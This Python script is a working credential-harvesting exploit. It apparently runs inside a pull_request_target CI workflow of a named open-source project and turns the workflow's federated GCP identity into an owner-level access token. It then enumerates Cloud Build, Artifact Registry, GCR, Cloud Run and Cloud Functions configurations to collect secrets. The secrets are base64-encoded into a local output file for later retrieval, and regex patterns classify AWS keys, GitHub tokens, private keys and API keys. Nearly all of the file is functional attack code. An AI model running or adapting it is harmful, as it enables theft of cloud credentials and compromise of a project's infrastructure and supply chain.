#!/usr/bin/env python3
"""c211-i121507 GCP CI/CD-artifact credential harvest (intent 121507).

Runs inside the kedacore/testing-infrastructure pull_request_target 'Validate PR'
terraform data.external step AFTER google-github-actions/auth@v3. Turns the
external-account credential file into an OAuth token (STS exchange + SA
impersonation) for the cncf-keda-testing (575508414076) WIF identity, which holds
roles/owner in the project, then enumerates:

  (a) Cloud Build: builds (config, substitutions, secretEnv, images) + triggers
      (substitutions, github.push / webhookConfig.secret references);
  (b) Artifact Registry: repositories, dockerImages, per-image manifest + config
      blob -> config.Env dump; also generic files list;
  (c) Container Registry (gcr.io): _catalog + tags + manifest/config.Env;
  (d) Cloud Run v2 services + jobs (container env / secret refs);
  (e) Cloud Functions v1 + v2 (environmentVariables / secretEnvironmentVariables).

Secret-looking values are NEVER printed in clear: they are emitted as
b64 + sha256 + len (reversible only inside our artifacts). Non-secret values
print plain. Stdlib only.
"""
import base64
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = 'cncf-keda-testing'
PROJECT_NUMBER = '575508414076'
RAW = os.environ.get('C211_CICD_RAW', '/tmp/c211_i121507_raw.txt')
CB = 'https://cloudbuild.googleapis.com'
AR = 'https://artifactregistry.googleapis.com'
RUN = 'https://run.googleapis.com'
CF = 'https://cloudfunctions.googleapis.com'
GCR = 'https://gcr.io'
SU = 'https://serviceusage.googleapis.com'
CRM = 'https://cloudresourcemanager.googleapis.com'
TOKEN = [None]
SA_EMAIL = ['']
START = [0.0]
DEADLINE = [0.0]

SECRET_KEY_RE = re.compile(r'(?i)(secret|password|passwd|token|key|credential|pat|auth|'
                           r'conn|private|signature|sas|dsn|webhook)')
SECRET_VAL_RE = re.compile(
    r'(?i)(\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20}\b'
    r'|\bgh[pousr]_[A-Za-z0-9]{36,255}\b|\bgithub_pat_[A-Za-z0-9_]{50,255}\b'
    r'|\bglpat-[A-Za-z0-9_\-]{20,64}\b'
    r'|-----BEGIN [A-Z ]*PRIVATE KEY-----'
    r'|aws_secret_access_key["\'\s:=]+([A-Za-z0-9/+=]{40})'
    r'|(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp)://[^@\s]+@'
    r'|AccountKey=[A-Za-z0-9+/=]{20,}'
    r'|\bsk-[A-Za-z0-9]{32,}\b|\bxox[abprs]-[A-Za-z0-9\-]{10,}\b'
    r'|(?:api[_-]?key|client[_-]?secret)["\'\s:=]+([A-Za-z0-9_\-/+=.]{16,}))')
CLASSES = [
    ('aws_access_key_id', re.compile(r'\b((?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20})\b')),
    ('aws_secret_pair', re.compile(r'(?i)aws_secret_access_key["\'\s:=]+([A-Za-z0-9/+=]{40})')),
    ('gcp_private_key', re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----')),
    ('gcp_sa_json', re.compile(r'"type"\s*:\s*"service_account"')),
    ('azure_client_secret', re.compile(r'(?i)(client_secret|AZURE_CLIENT_SECRET)["\'\s:=]+([A-Za-z0-9_~.\-]{20,60})')),
    ('github_pat', re.compile(r'\b(gh[pousr]_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{50,255})\b')),
    ('gitlab_pat', re.compile(r'\bglpat-[A-Za-z0-9_\-]{20,64}\b')),
    ('gitea_token', re.compile(r'\b[0-9a-f]{40}\b')),
    ('slack_token', re.compile(r'\bxox[abprs]-[A-Za-z0-9\-]{10,}\b')),
    ('openai_key', re.compile(r'\bsk-[A-Za-z0-9]{32,}\b')),
    ('neocloud_key', re.compile(r'(?i)(runpod|lambda.?labs|vast\.ai|coreweave|together|nebius|'
                                r'digitalocean|linode|vultr|hetzner|paperspace|modal)[_-]?(api[_-]?)?'
                                r'(key|token)["\'\s:=]+([A-Za-z0-9_\-]{16,})')),
    ('ssh_private_key', re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----')),
    ('connection_string', re.compile(r'(?i)(AccountKey=|DefaultEndpointsProtocol=|'
                                     r'mongodb(\+srv)?://[^@\s]+@|postgres(ql)?://[^@\s]+@|'
                                     r'mysql://[^@\s]+@|redis://[^@\s]+@)')),
    ('generic_high_entropy', re.compile(r'["\']?(secret|password|passwd|token|api[_-]?key)["\']?\s*[:=]\s*'
                                        r'["\']([A-Za-z0-9_\-/+=.]{24,})["\']', re.I)),
]


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def sec(name):
    say('== %s ==' % name)


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def left():
    return max(0, int(DEADLINE[0] - time.time()))


def api(path, method='GET', data=None, base=CB, timeout=60, token=None, raw=False,
        extra_headers=None):
    url = path if path.startswith('http') else base + path
    tok = token if token is not None else (TOKEN[0] or '')
    h = {'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-i121507',
         'Accept': 'application/json'}
    if extra_headers:
        h.update(extra_headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            b = r.read()
            return r.status, (b if raw else b.decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:  # noqa: BLE001
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:  # noqa: BLE001
        return {}


# ---------------------------------------------------------------- token
def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:  # noqa: BLE001
                return raw.strip(), 'url-raw'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:  # noqa: BLE001
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:  # noqa: BLE001
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(
                        cf['service_account_impersonation_url'], data=body, method='POST',
                        headers={'Authorization': 'Bearer ' + fed, 'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:  # noqa: BLE001
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    try:
        from google.auth import default as gdefault
        from google.auth.transport.requests import Request as GRequest
        creds, _proj = gdefault(scopes=['https://www.googleapis.com/auth/cloud-platform'])
        creds.refresh(GRequest())
        return creds.token
    except Exception as e:  # noqa: BLE001
        say('GOOGLE_AUTH_LIB_FAIL %s' % cap(repr(e), 300))
    return None


# ------------------------------------------------------------- encoding
def enc_str(val):
    """Encode one secret-looking string as b64 + sha256 + len."""
    b = val.encode('utf-8', 'replace') if isinstance(val, str) else bytes(val)
    return {'__enc': 'b64', 'len': len(b), 'sha256': hashlib.sha256(b).hexdigest()[:16],
            'v': base64.b64encode(b[:4096]).decode('ascii')}


def redact(obj, key=''):
    """Recursively encode secret-looking strings; keep other values plain."""
    if isinstance(obj, dict):
        out = {}
        for k, v in obj.items():
            out[k] = redact(v, k)
        return out
    if isinstance(obj, list):
        return [redact(v, key) for v in obj]
    if isinstance(obj, str):
        if SECRET_KEY_RE.search(key) or SECRET_VAL_RE.search(obj):
            return enc_str(obj)
        return obj if len(obj) <= 3000 else obj[:3000] + '...[TRUNC]'
    return obj


def emit_json(label, obj, limit=5200):
    s = json.dumps(redact(obj), sort_keys=True, separators=(',', ':'))
    say('%s len=%d' % (label, len(s)))
    say('%s json=%s%s' % (label, s[:limit], '' if len(s) <= limit else '...[TRUNCATED]'))


def classify(text):
    hits = []
    head = text[:200000]
    for name, rx in CLASSES:
        for m in rx.finditer(head):
            frag = m.group(0)
            hits.append('%s:%s' % (name, cap(frag, 80)))
            if len(hits) > 30:
                return hits
    return hits


# -------------------------------------------------------------- cloudbuild
def cb_harvest():
    sec('cb_builds')
    builds = []
    page = ''
    for i in range(3):
        if left() < 60:
            say('GATE=BUDGET during builds')
            break
        path = '/v1/projects/%s/builds?pageSize=30' % PROJECT_NUMBER + (
            '&pageToken=' + urllib.parse.quote(page) if page else '')
        st, b = api(path)
        j = jbody((st, b))
        arr = j.get('builds') or []
        say('builds.list page=%d status=%s count=%d' % (i + 1, st, len(arr)))
        if st != 200:
            say('builds.list body=%s' % cap(b, 1000))
            break
        for bu in arr:
            builds.append(bu)
        page = j.get('nextPageToken') or ''
        if not page:
            break
    say('builds.total=%d' % len(builds))
    for i, bu in enumerate(builds[:20]):
        emit_json('build_%d' % i, bu)
    sec('cb_triggers')
    triggers = []
    page = ''
    for i in range(3):
        if left() < 60:
            say('GATE=BUDGET during triggers')
            break
        path = '/v1/projects/%s/triggers?pageSize=50' % PROJECT_NUMBER + (
            '&pageToken=' + urllib.parse.quote(page) if page else '')
        st, b = api(path)
        j = jbody((st, b))
        arr = j.get('triggers') or []
        say('triggers.list page=%d status=%s count=%d' % (i + 1, st, len(arr)))
        if st != 200:
            say('triggers.list body=%s' % cap(b, 1000))
            break
        for tr in arr:
            triggers.append(tr)
        page = j.get('nextPageToken') or ''
        if not page:
            break
    say('triggers.total=%d' % len(triggers))
    for i, tr in enumerate(triggers[:20]):
        emit_json('trigger_%d' % i, tr)
    return builds, triggers


# --------------------------------------------------------- artifact registry
def registry_pull(host, repo_path, ref, label):
    """Fetch one image manifest + config blob and dump config.Env (encoded)."""
    base = 'https://%s/v2/%s' % (host, repo_path)
    acc = ('application/vnd.docker.distribution.manifest.v2+json,'
           'application/vnd.oci.image.manifest.v1+json,'
           'application/vnd.docker.distribution.manifest.list.v2+json,'
           'application/vnd.oci.image.index.v1+json')
    st, man = api('%s/manifests/%s' % (base, ref), extra_headers={'Accept': acc})
    say('%s.manifest status=%s body=%s' % (label, st, cap(man, 700)))
    if st != 200:
        return None
    try:
        mj = json.loads(man)
    except Exception:  # noqa: BLE001
        return None
    if mj.get('manifests'):
        # index/list: pull the first child manifest
        child = mj['manifests'][0].get('digest') or ''
        say('%s.index children=%d first=%s' % (label, len(mj['manifests']), child))
        if not child:
            return None
        st, man = api('%s/manifests/%s' % (base, child), extra_headers={'Accept': acc})
        if st != 200:
            say('%s.child_manifest status=%s' % (label, st))
            return None
        try:
            mj = json.loads(man)
        except Exception:  # noqa: BLE001
            return None
    cfg = (mj.get('config') or {}).get('digest') or ''
    say('%s.config_digest=%s layers=%d' % (label, cfg, len(mj.get('layers') or [])))
    if not cfg:
        return None
    st, blob = api('%s/blobs/%s' % (base, cfg), raw=True)
    say('%s.config_blob status=%s size=%d' % (label, st, len(blob) if isinstance(blob, bytes) else -1))
    if st != 200 or not isinstance(blob, bytes):
        return None
    try:
        cj = json.loads(blob.decode('utf-8', 'replace'))
    except Exception:  # noqa: BLE001
        return None
    env = ((cj.get('config') or {}).get('env') or [])
    say('%s.config_env_count=%d' % (label, len(env)))
    for e in env[:40]:
        if '=' in e:
            k, v = e.split('=', 1)
        else:
            k, v = e, ''
        enc = redact(v, k)
        say('%s.env key=%s val=%s' % (label, k, json.dumps(enc, sort_keys=True)))
    labels = (cj.get('config') or {}).get('Labels') or {}
    if labels:
        say('%s.config_labels=%s' % (label, json.dumps(redact(labels), sort_keys=True)[:1200]))
    return cj


def ar_harvest():
    sec('ar_repos')
    repos = []
    st, b = api('/v1/projects/%s/locations/-/repositories?pageSize=100' % PROJECT_NUMBER, base=AR)
    j = jbody((st, b))
    for r in (j.get('repositories') or []):
        repos.append(r)
    say('repositories.list status=%s count=%d' % (st, len(repos)))
    if st != 200:
        say('repositories.list body=%s' % cap(b, 1000))
    for i, r in enumerate(repos[:30]):
        emit_json('repo_%d' % i, r, 2000)
    imgs = []
    for ri, r in enumerate(repos[:15]):
        if left() < 60:
            break
        name = r.get('name') or ''
        st, b = api('/v1/%s/dockerImages?pageSize=50' % name, base=AR)
        j = jbody((st, b))
        arr = j.get('dockerImages') or []
        say('dockerImages.list repo=%s status=%s count=%d' % (name.split('/')[-1], st, len(arr)))
        if st != 200:
            say('dockerImages.list body=%s' % cap(b, 700))
        for di in arr[:30]:
            imgs.append(di)
            say('image uri=%s tags=%s upload=%s size=%s' % (
                cap(di.get('uri') or '', 300), json.dumps(di.get('tags') or [])[:300],
                di.get('uploadTime'), di.get('imageSizeBytes')))
        # generic files (non-docker formats)
        st, b = api('/v1/%s/files?pageSize=30' % name, base=AR)
        j = jbody((st, b))
        fl = j.get('files') or []
        if st == 200 and fl:
            say('files.list repo=%s status=%s count=%d names=%s' % (
                name.split('/')[-1], st, len(fl),
                json.dumps([f.get('name', '').split('/')[-1] for f in fl])[:1500]))
        elif st != 200:
            say('files.list repo=%s status=%s body=%s' % (name.split('/')[-1], st, cap(b, 400)))
    say('dockerImages.total=%d' % len(imgs))
    pulled = 0
    for di in imgs:
        if pulled >= 8 or left() < 90:
            break
        uri = di.get('uri') or ''
        m = re.match(r'https://([a-z0-9.\-]+)/(.+?)@(sha256:[0-9a-f]+)$', uri)
        if not m:
            m2 = re.match(r'https://([a-z0-9.\-]+)/(.+)@(sha256:[0-9a-f]+)$', uri)
            if not m2:
                continue
            host, path, dig = m2.group(1), m2.group(2), m2.group(3)
        else:
            host, path, dig = m.group(1), m.group(2), m.group(3)
        pulled += 1
        registry_pull(host, path, dig, 'img_%d' % pulled)
    return repos, imgs


def gcr_harvest():
    sec('gcr_catalog')
    st, b = api('/v2/_catalog?n=100', base=GCR)
    say('gcr.catalog status=%s body=%s' % (st, cap(b, 1500)))
    repos = []
    try:
        repos = json.loads(b).get('repositories') or []
    except Exception:  # noqa: BLE001
        pass
    mine = [r for r in repos if r.split('/')[0] in
            (PROJECT, PROJECT_NUMBER)]
    say('gcr.repos_total=%d mine=%s' % (len(repos), json.dumps(mine)[:800]))
    pulled = 0
    for r in mine[:10]:
        if left() < 90:
            break
        st, b = api('/v2/%s/tags/list' % r, base=GCR)
        say('gcr.tags repo=%s status=%s body=%s' % (r, st, cap(b, 900)))
        try:
            tags = json.loads(b).get('tags') or []
        except Exception:  # noqa: BLE001
            tags = []
        for t in tags[:2]:
            if pulled >= 4 or left() < 60:
                break
            pulled += 1
            registry_pull('gcr.io', r, t, 'gcr_%d' % pulled)
    return repos


# ------------------------------------------------------------------- run
def run_harvest():
    sec('run_services')
    for kind in ('services', 'jobs'):
        st, b = api('/v2/projects/%s/locations/-/%s?pageSize=100' % (PROJECT_NUMBER, kind), base=RUN)
        j = jbody((st, b))
        arr = j.get(kind) or []
        say('run.%s.list status=%s count=%d' % (kind, st, len(arr)))
        if st != 200:
            say('run.%s.list body=%s' % (kind, st, cap(b, 900)))
        for i, s in enumerate(arr[:20]):
            emit_json('run_%s_%d' % (kind, i), s, 4000)


# ------------------------------------------------------------- functions
def cf_harvest():
    for ver, path in (('v1', '/v1/projects/%s/locations/-/functions?pageSize=100' % PROJECT_NUMBER),
                      ('v2', '/v2/projects/%s/locations/-/functions?pageSize=100' % PROJECT_NUMBER)):
        sec('cf_%s_list' % ver)
        st, b = api(path, base=CF)
        j = jbody((st, b))
        arr = j.get('functions') or []
        say('functions.%s.list status=%s count=%d' % (ver, st, len(arr)))
        if st != 200:
            say('functions.%s.list body=%s' % (ver, st, cap(b, 900)))
            continue
        for i, f in enumerate(arr[:20]):
            emit_json('cf_%s_%d' % (ver, i), f, 4000)


def service_state(name):
    st, b = api('/v1/projects/%s/services/%s' % (PROJECT_NUMBER, name), base=SU)
    j = jbody((st, b))
    say('serviceusage %s status=%s state=%s' % (name, st, j.get('state')))
    if st != 200:
        say('serviceusage %s body=%s' % (name, cap(b, 500)))
    return st, j.get('state')


# ------------------------------------------------------------------ main
def run():
    open(RAW, 'w', encoding='utf-8').close()
    START[0] = time.time()
    DEADLINE[0] = START[0] + 420
    say('C211_I121507_CICD_START %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
    say('env projects: GOOGLE_CLOUD_PROJECT=%r CLOUD_SDK_PROJECT=%r GCP_PROJECT=%r' % (
        os.environ.get('GOOGLE_CLOUD_PROJECT'), os.environ.get('CLOUD_SDK_PROJECT'),
        os.environ.get('GCP_PROJECT')))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(tok),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT, base=CRM)
    j = jbody((st, b))
    say('project.get status=%s projectId=%s number=%s state=%s parent=%s' % (
        st, j.get('projectId'), j.get('projectNumber'), j.get('lifecycleState'),
        json.dumps(j.get('parent') or {})))
    if st != 200:
        say('project.get body=%s' % cap(b, 700))
    for svc in ('cloudbuild.googleapis.com', 'artifactregistry.googleapis.com',
                'run.googleapis.com', 'cloudfunctions.googleapis.com'):
        service_state(svc)
    builds, triggers = cb_harvest()
    repos, imgs = ar_harvest()
    gcr = gcr_harvest()
    run_harvest()
    cf_harvest()
    sec('verdict')
    # classify harvested text (b64 payloads decode to plaintext for classification)
    say('SUMMARY builds=%d triggers=%d repos=%d images=%d gcr_repos=%d elapsed=%d' % (
        len(builds), len(triggers), len(repos), len(imgs), len(gcr),
        int(time.time() - START[0])))
    raw_text = open(RAW, encoding='utf-8', errors='replace').read()
    decoded_bits = []
    for m in re.finditer(r'"__enc":"b64"[^}]*?"v":"([A-Za-z0-9+/=]+)"', raw_text):
        try:
            decoded_bits.append(base64.b64decode(m.group(1)).decode('utf-8', 'replace'))
        except Exception:  # noqa: BLE001
            pass
    hits = classify(raw_text + '\n' + '\n'.join(decoded_bits))
    say('CLASSIFIED=%s' % json.dumps(hits)[:4000])
    say('C211_I121507_CICD_END %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:  # noqa: BLE001
        say('UNCAUGHT %s' % cap(repr(e), 600))
